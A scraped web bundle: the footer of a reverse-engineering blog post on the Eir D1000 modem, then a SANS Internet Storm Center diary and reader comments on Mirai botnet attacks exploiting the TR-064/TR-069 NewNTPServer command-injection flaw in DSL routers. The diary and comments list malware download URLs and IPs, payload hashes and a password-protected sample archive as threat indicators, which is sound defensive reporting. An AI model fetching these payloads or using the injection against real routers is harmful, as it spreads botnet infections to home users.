71. Pingback: [Check if your Home Router is Vulnerable](https://www.wordfence.com/blog/2017/04/check-your-router/)
73. Pingback: [Check if your Home Router is Vulnerable - WekkyDesign | Web design in Lagos, Nigeria.](https://wekkydesign.com/general-security/check-if-your-home-router-is-vulnerable)
75. Pingback: [Home Routers Used to Hack WordPress Sites – BleepingComputer – newsbox](http://nbox.wpblog.jp/2017/04/12/home-routers-used-to-hack-wordpress-sites-bleepingcomputer/)
77. Pingback: [Check if Your Home Router is Vulnerable | Online Entrepreneur Resource](http://entrepreneurbiz.info/check-if-your-home-router-is-vulnerable/)
79. Pingback: [Hackers se apoyan en routers situados en hogares para atacar sitios web WordPress | NoticiasDeHacking](http://noticiasdehacking.com/2017/04/13/hackers-se-apoyan-en-routers-situados-en-hogares-para-atacar-sitios-web-wordpress/)
81. Pingback: [Hackers se apoyan en routers situados en hogares para atacar sitios web WordPress | Seguridad Informática](https://blogseguridadblog.wordpress.com/2017/04/15/hackers-se-apoyan-en-routers-situados-en-hogares-para-atacar-sitios-web-wordpress/)
83. Pingback: [Thousands of Hacked Home Routers are Attacking WordPress Sites | DCS Enterprise](https://dcsenterprise.net/thousands-of-hacked-home-routers-are-attacking-wordpress-sites/)
85. Pingback: [Is your router compromised? - Taybridge Consulting](https://taybridgeconsulting.com/is-your-router-compromised/)
87. Pingback: [Home Routers Used to Hack WordPress Sites – BleepingComputer – ITC](http://com12.wpblog.jp/wordpress/6499)
89. Pingback: [Hackers se apoyan en routers situados en hogares para atacar sitios web WordPress – Seguridad PY](https://www.seguridadpy.info/2017/04/hackers-se-apoyan-en-routers-situados-en-hogares-para-atacar-sitios-web-wordpress/)
91. Pingback: [Home Routers Used to Hack WordPress Sites – Bleeping Computer – BleepingComputer – newsbox](http://nbox.wpblog.jp/2017/04/12/home-routers-used-to-hack-wordpress-sites-bleeping-computer-bleepingcomputer/)
93. Pingback: [Home Routers Used to Hack WordPress Sites – Bleeping Computer – BleepingComputer – ITC](http://com12.wpblog.jp/wordpress/7014)
95. Pingback: [Thousands of Hacked Home Routers are Attacking WordPress Sites |](http://wpstack.blog/2017/04/21/thousands-of-hacked-home-routers-are-attacking-wordpress-sites/)
97. Pingback: [Check if Your Home Router is Vulnerable – WordPress Journel](http://www.wpjournel.com/2017/04/28/check-if-your-home-router-is-vulnerable/)
99. Pingback: [Thousands of Hacked Home Routers are Attacking WordPress Sites – WordPress Journel](http://www.wpjournel.com/2017/04/30/thousands-of-hacked-home-routers-are-attacking-wordpress-sites/)

## Comment navigation

[Older Comments](https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/comment-page-1/#comments)[Newer Comments](https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/#comments)

### Leave a comment [Cancel reply](/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/comment-page-2/#respond)

Δ

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

Menu
## Menu

* [About](https://devicereversing.wordpress.com/about/)
* [Contact](https://devicereversing.wordpress.com/contact/)

* [Comment](https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/#comments)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Reverse Engineering Blog](https://devicereversing.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fdevicereversing.wordpress.com%2F2016%2F11%2F07%2Feirs-d1000-modem-is-wide-open-to-being-hacked%2F&signup_flow=account)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Reverse Engineering Blog](https://devicereversing.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fdevicereversing.wordpress.com%2F2016%2F11%2F07%2Feirs-d1000-modem-is-wide-open-to-being-hacked%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/p850z3-n)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/)
  + [View post in Reader](https://wordpress.com/read/blogs/119404501/posts/23)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from isc.sans.edu_77baba69_20250125_215332.html ===

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Jesse La Grew](/handler_list.html#jesse-la-grew "Jesse La Grew")

Threat Level: [green](/infocon.html)

* [previous](/diary/21759)
* [next](/diary/21767)

My next class:

| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/cyber-security-east-jan-2025/course/application-security-securing-web-apps-api-microservices) | Online | US Eastern | Jan 27th - Feb 1st 2025 |
| --- | --- | --- |

# [TR-069 NewNTPServer Exploits: What we know so far](/forums/diary/TR069%2BNewNTPServer%2BExploits%2BWhat%2Bwe%2Bknow%2Bso%2Bfar/21763/)

**Published**: 2016-11-29. **Last Updated**: 2016-11-29 22:36:43 UTC

**by** [Johannes Ullrich](https://plus.google.com/101587262224166552564?rel=author) (Version: 1)

[13 comment(s)](/diary/TR069%2BNewNTPServer%2BExploits%2BWhat%2Bwe%2Bknow%2Bso%2Bfar/21763/#comments)

[This is a "cleaned up" version to summarize yesterday's diary about the attacks against DSL Routers]

### What is "TR-069"

TR-069 (or its earlier version TR-064) is a standard published by the Broadband Forum. The Broadband Forum is an industry organization defining standards used to manage broadband networks. It focuses heavily on DSL type modems and more recently included fiber optic connections. "TR" stands for "Technical Report". TR-069 is considered the Broadband Forum's "Flagship Standard". [1] Many ISPs and device manufacturers are members of the broadband forum.

TR-069 allows ISPs to manage modems remotely. Port 7547 has been assigned to this protocol. Some devices appear to use port 5555 instead. I haven't found a standard defining port 5555 for this use, but it may be an older version. The standard suggests the use of TLS 1.2 but doesn't require it, and TLS would not have made a difference in this case. Authentication can happen via certificates, or

TR-069 messages are encoded using SOAP. These SOAP requests include a message that is then parsed by the modem (CPE, "Consumer Premise Equipment). The standard defines a large range of required and optional features. For example, the modem can be rebooted, or reset to factory condition. A TR-069 message can also be used to get and set configuration parameters. Some of these parameters and the detail of the data model are defined in later technical reports. For example, TR-098 defined the NTP server feature abused in the exploit attempts we have seen.

A typical (non exploit) request to set an NTP Server would look like: (click on images for full size versions)

[![](https://isc.sans.edu/diaryimages/images/Screen%20Shot%202016-11-29%20at%2010_27_10%20AM.png)](https://isc.sans.edu/diaryimages/images/Screen%20Shot%202016-11-29%20at%2010_27_10%20AM.png)

The response the modem would return will be:

[![](https://isc.sans.edu/diaryimages/images/Screen%20Shot%202016-11-29%20at%2010_29_13%20AM.png)](https://isc.sans.edu/diaryimages/images/Screen%20Shot%202016-11-29%20at%2010_29_13%20AM.png)

### The Vulnerability & Exploit

On November 7th, 2016, "kenzo2017" posted a blog post showing how the TR-064 "NewNTPServer" feature can be used to execute arbitrary commands. The blog post mentioned only the D1000 modem used by Irish ISP Eir as vulnerable [2]. As a proof of concept, the blog post included a Metasploit module to execute commands, and to retrieve the modems WiFi password. This particular modem is a rebranded modem manufactured by Zyxel. Other Eir modems (e.g. P-60HN-T1A\_IPv6) were found to be vulnerable as well. There is no mention of Eir being notified of this issue. I also can't find a CVE number for this vulnerability.

This isn't the first time TR-069 implementations were found to be vulnerable. Over the last couple of years, a number of different issues were discovered, most notably a "Misfortune Cookie" bug ([CVE-2014-9222](/vuln.html?cve=2014-9222)).

### Deutsche Telekom Outage

On Sunday, November 27th, 2016, a large number of Deutsche Telekom customers reported connectivity problems. These issues were later traced to attacks against a particular type of modem. Deutsche Telekom uses the brand name "Speedport" for its modems, but the modems themselves are manufactured by different companies. Deutsche Telekom lists the Speedport W 921 V, 723V Typ B, and 921 Fiber as affected. All of these modems are made by Taiwanese company Acadyan, which does not appear to be connected to Zyxel, the maker of the vulnerable Eir modem. [3] Comsecuris ran tests on one of the modems and found it not vulnerable, but they did point out that the modem will become slow and "hang" even under moderate load, so it is possible that the connections Mirai sent to the modem caused it to hang, not the exploit itself. [4]

Deutsche Telekom rolled out a firmware update to fix the vulnerability exploited by the attack. There has been no official statement from Deutsche Telekom confirming that the TR-069 attack was used to crash the modem. However, Deutsche Telekom did state that an "coding error" in the exploit caused the modems to crash instead of run the exploit code.

### Increase in Scans for Port 7547

Around the time the outage in Germany, we did notice a substantial increase in the number of attacks against [port 7547](/port/7547). Later, a similar increase was noted on %%port:5555%.

[![](https://isc.sans.edu/diaryimages/images/Screen%20Shot%202016-11-29%20at%2010_52_33%20AM.png)](https://isc.sans.edu/diaryimages/images/Screen%20Shot%202016-11-29%20at%2010_52_33%20AM.png)

Honeypots confirmed that these scans are attempting to exploit the TR-069 NewNTPServer vulnerability (line breaks and color added for readability)

.[![](https://isc.sans.edu/diaryimages/images/Screen%20Shot%202016-11-29%20at%2010_59_42%20AM.png)](https://isc.sans.edu/diaryimages/images/Screen%20Shot%202016-11-29%20at%2010_59_42%20AM.png)

The command executed will download additional malware from "tr069.pw" and execute it. We found a number of different URLs being used. The file name varies from 1 through 7, but 1 and 2 are the most common once seen. There is also an "x.sh" script, but it usually doesn't exist on the web server.

Here are some of the URLs seen in our honeypots, as well as URLs observed by our readers:

 http://5.8.65.5/1

 http://5.8.65.5/2

 http://l.ocalhost.host/1

 http://l.ocalhost.host/2

 http://l.ocalhost.host/3

 http://l.ocalhost.host/x.sh

 http://p.ocalhost.host/x.sh

 http://timeserver.host/1

 http://ntp.timerserver.host/1

 http://tr069.pw/1

 http://tr069.pw/2

 http://srrys.pw/2 (resolves to 5.188.232.152 right now. the other host names appear dead right now)

The different binaries (1-7) are essentially the same code, but compiled for different architectures. This may indicate that the same exploit is attempted against a wide range of vulnerable devices:

1: ELF 32-bit LSB  executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped

2: ELF 32-bit LSB  executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped

3: ELF 32-bit LSB  executable, ARM, version 1, statically linked, stripped

4: ELF 32-bit LSB  executable, Renesas SH, version 1 (SYSV), statically linked, stripped

5: ELF 32-bit MSB  executable, PowerPC or cisco 4500, version 1 (SYSV), statically linked, stripped

6: ELF 32-bit MSB  executable, SPARC version 1 (SYSV), statically linked, stripped

7: ELF 32-bit MSB  executable, Motorola 68020 - invalid byte order, version 1 (SYSV), statically linked, stripped

Hashes observed (they vary based on the URL used to spread the code):

```

01fb38152c7f86aca2c42e8e8ebc46a9abeeac0501b0800e8009ee6328d112fd  1
b4d378a917b01bbb8a783bbd7a8cfe070c7dd6ac7b8aa5f205df6e7e24f0a85e  2
1fce697993690d41f75e0e6ed522df49d73a038f7e02733ec239c835579c40bf  3
828984d1112f52f7f24bbc2b15d0f4cf2646cd03809e648f0d3121a1bdb83464  4
c597d3b8f61a5b49049006aff5abfe30af06d8979aaaf65454ad2691ef03943b  5
046659391b36a022a48e37bd80ce2c3bd120e3fe786c204128ba32aa8d03a182  6
5d4e46b3510679dc49ce295b7f448cd69e952d80ba1450f6800be074992b07cc  7

```

Based on a simple "strings" analysis, the code downloaded is the spreader looking for additional vulnerable systems. This code appears to be derived from the "Mirai" botnet. While earlier versions of Mirai used well know default or weak passwords, this version now added the TR-069 NetNTPServer exploit to its repertoire. The command and control servers resolve to a 6.0.0.0/8 IP address at this point which does not appear to be operations. It is assumed that this is used to "park" the botnet.

### Countermeasures

As a consumer, if you suspect that your modem is vulnerable or worse, exploited: Reboot your modem and check on firmware updates. For some ISPs, like Deutsche Telekom, firmware updates are avaialbe. But you will typically receive the firmware from your ISP, not the modem's manufacturer. ISPs customize firmware, like for example by enabling TR-069, and a "default" manufacturer provided firmware may not work for you.

ISPs should (and typically will) restrict access to port 7547 and port 5555 if it is used for remote configuration. Modem should only accept connections from specific configuration servers. TR-069 implementations had vulnerabilities in the past, and it is very likely that additional issues will be found in the future. Restricting access to the port is necessary to protect the modem from exploits against unpatched vulnerabilities.

### How Many Modems Are Vulnerable?

The number of devices listening on port 7547 is as larger as 40 Million according to counts performed with Shodan. But not all these modems may run vulnerable implementations, and some may only accept commends from specific servers. It is difficult to say which modems are vulnerable and which once are safe. My personal "best guess" is that this vulnerability may have added 1-2 Million new bots to the Mirai botnet. We do have about 600,000 source IPs scanning for this vulnerability in our database. But many of them may have been infected by Mirai via weak passwords. For a small number of sources that responded on Port 443, we connected and retrieved TLS certificates. The overwhelming portion of certificates where issues by Zyxel, indicating that it is infected Zyxel devices that are participating in the scanning.

Some tests done by Darren Martyn show that modems used by UK ISP TalkTalk, D-Link DSL 3780 modems, modems made by MitraStar, Digicom and Aztech are all vulnerable. He states that he found 48 different vulnerable devices [5]

The attack so far doesn't appear to be targeting a particular geographic area or a particular ISP.

### What's Next?

At this point, the newly infected systems are just used to scan for more victims. But it is probably just a matter of time until they are used for DDoS attacks.

### Further Reading

https://badcyber.com/new-mirai-attack-vector-bot-exploits-a-recently-discovered-router-vulnerability/

https://twitter.com/info\_dox

Samples: https://isc.sans.edu/diaryimages/miraitr069binaries.zip (password: infected)

[1] https://www.broadband-forum.org/technical/download/TR-069\_Amendment-5.pdf

[2] https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/

[3] https://de.wikipedia.org/wiki/Speedport​

[4] https://comsecuris.com/blog/posts/were\_900k\_deutsche\_telekom\_routers\_compromised\_by\_mirai/

[5] https://twitter.com/info\_dox

---

Johannes B. Ullrich, Ph.D.

[STI](http://www.sans.edu)|[Twitter](http://jbu.me/164)|[LinkedIn](http://jbu.me/163)

Keywords:
[13 comment(s)](/diary/TR069%2BNewNTPServer%2BExploits%2BWhat%2Bwe%2Bknow%2Bso%2Bfar/21763/#comments)
My next class:

| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/cyber-security-east-jan-2025/course/application-security-securing-web-apps-api-microservices) | Online | US Eastern | Jan 27th - Feb 1st 2025 |
| --- | --- | --- |

* [previous](/diary/21759)
* [next](/diary/21767)

### Comments

This has been covered as far back as August 14th, 2014.

http://www.routercheck.com/2014/08/14/major-problems-tr-069/

Over two years since serious, credible concerns were raised and nobody cared enough to fix it in all that time? That's some serious negligence there.
#### Anonymous

#### Nov 29th 20168 years ago

When feeding the download URLs to Virustotal, the URLs look harmless. Queried via Virustotal the sites seem to return 404 for the files in question.
#### Anonymous

#### Nov 30th 20168 years ago

Thank you very much for the informative summary!

One question though...

You wrote that "ISPs should (and typically will) restrict access to port 7547 and port 5555 if it is used for remote configuration".

Does that mean that for whatever reason the affected Telekom routers/customers had not such restrictions in place?
#### Anonymous

#### Nov 30th 20168 years ago

Good round up of the issues.

One thing worth correcting is that the exposed protocol is TR-064, not TR-069. TR-069 is only meant to connect from the router to an ISP's server, and doesn't accept settings by POST requests. TR-064 does accept settings via a POST request.

TR-064 isn't an earlier version of TR-069, it's a different protocol.

TR-064 is "LAN-Side DSL CPE Configuration" i.e. it is never supposed to be exposed to the WAN. The spec says it must always have authentication, so a number of failures here.
#### Anonymous

#### Nov 30th 20168 years ago

Just to be accurate:

TR-064 isn't the ancestor of TR-069: it was designed to allow \*LAN-side management\* whereas TR-069 is for the WAN side. (By the way, it's now deprecated in favor of UPnP DM.)

For a device to expose TR-064 on the WAN side is clearly a bad idea.

jd
#### Anonymous

#### Nov 30th 20168 years ago

A very interesting and thorough article! The second paragraph appears to be truncated, though:

[quote]Authentication can happen via certificates, or [/quote]
#### Anonymous

#### Nov 30th 20168 years ago

if we shut port 7547,we can neutralised the effect and services will be up but the ISP side management goes off.
#### Anonymous

#### Nov 30th 20168 years ago

Interesting article. And just thé article i was looking for.

We happen to use a ftp server in which we a few years ago (don't ask me why) choose 5555 for the port.

I saw a large increase of traffic and login's to NTP services on that particular FTP server. It has no use whatsoever; but the increase in traffic was substantial.

I didn't know older NTP services uses 5555 for the port. We changed the port settings and the logins/attacks stopped immediately

So a big thank you!
#### Anonymous

#### Nov 30th 20168 years ago

Seems most of the domains actually host all 8 of the files.

Todays:

hxxp://srrys.pw/1

hxxp://srrys.pw/2

hxxp://srrys.pw/3

hxxp://srrys.pw/4

hxxp://srrys.pw/5

hxxp://srrys.pw/6

hxxp://srrys.pw/7

hxxp://srrys.pw/x.sh

Remarkably is that x.sh still refers to l.ocalhost.host, which doesn't resolve anymore. wget of '1' and '2' is by far the most common seen on our infrastructure, while '3' also starts using port 5555 (https://detux.org/report.php?sha256=1fce697993690d41f75e0e6ed522df49d73a038f7e02733ec239c835579c40bf)
#### Anonymous

#### Nov 30th 20168 years ago

Hello,

I have a Zyxel AMG1312-T10B router with firmware V2.00(AAFP.6)C0

TR-069 protocol is disabled on my router (like Upnp, WPS etc.) but after finding this article I ran a scan with Nmap on port 7547 and with great surprise it was found open even though the firewall was active !

How to identify if a router was compromised with this exploit? There is some particular check to make on the router file system accessible via ssh ?

- A comparison of the current config file with an old one revealed no changes in the configuration file itself.

- A firewall rule to block port 7547 access from the wan has no effect on my router.

- The only effective way to disable TR-069 was to set the port to 0 on my router admin.
#### Anonymous

#### Nov 30th 20168 years ago

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)


